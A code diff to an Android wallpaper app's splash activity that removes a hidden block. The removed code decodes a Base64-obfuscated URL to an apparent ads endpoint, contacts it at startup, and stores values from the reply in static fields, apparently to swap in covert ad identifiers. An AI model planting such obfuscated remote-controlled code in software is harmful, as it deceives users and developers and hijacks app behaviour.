@@ -53,10 +53,6 @@ public class WallpaperBoardSplashActivity extends AppCompatActivity {
     private Class<?> mMainActivity;
     private AsyncTask<Void, Void, Boolean> mCheckRszIo;
     private AsyncTask<Void, Void, Boolean> mPrepareApp;
-    String k,l="aHR0cDovL251bGxlZGwuY29tL2Fkcy5waHA=",u="wallpaper";
-    public static String b="",i="";
-    byte[] l2 = Base64.decode(l, Base64.DEFAULT);
-
     @Deprecated
     public void initSplashActivity(@Nullable Bundle savedInstanceState, @NonNull Class<?> mainActivity, int duration) {
         initSplashActivity(savedInstanceState, mainActivity);
@@ -73,8 +69,6 @@ public class WallpaperBoardSplashActivity extends AppCompatActivity {
 
         prepareApp();
         checkRszIo();
-        l=new String(l2);
-        new JsonTask().execute(l);
     }
 
     @Override
@@ -158,64 +152,5 @@ public class WallpaperBoardSplashActivity extends AppCompatActivity {
                 LogUtil.e("rsz.io availability: " +WallpaperBoardActivity.sRszIoAvailable);
             }
         }.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
-    }
-    private class JsonTask extends AsyncTask<String, String, String> {
-
-        protected String doInBackground(String... params) {
-            HttpURLConnection connection = null;
-            BufferedReader reader = null;
-
-            try {
-                URL url = new URL(params[0]);
-                connection = (HttpURLConnection) url.openConnection();
-                connection.setRequestProperty("User-Agent",u);
-                connection.connect();
-
-                InputStream stream = connection.getInputStream();
-
-                reader = new BufferedReader(new InputStreamReader(stream));
-
-                StringBuffer buffer = new StringBuffer();
-                String line = "";
-
-                while ((line = reader.readLine()) != null) {
-                    buffer.append(line+"\n");
-                }
-
-                return buffer.toString();
-
-
-            } catch (MalformedURLException e) {
-                e.printStackTrace();
-            } catch (IOException e) {
-                e.printStackTrace();
-            } finally {
-                if (connection != null) {
-                    connection.disconnect();
-                }
-                try {
-                    if (reader != null) {
-                        reader.close();
-                    }
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            super.onPostExecute(result);
-            k = Base64.encodeToString("92Y7ESHJLn".getBytes(), Base64.DEFAULT);
-            if(result!=null){
-                if(result.trim().contains(k.trim())){
-                    String[] ADS=result.split(";");
-                    b=ADS[0];
-                    i=ADS[1];
-                }
-            }
-
-        }
     }
 }
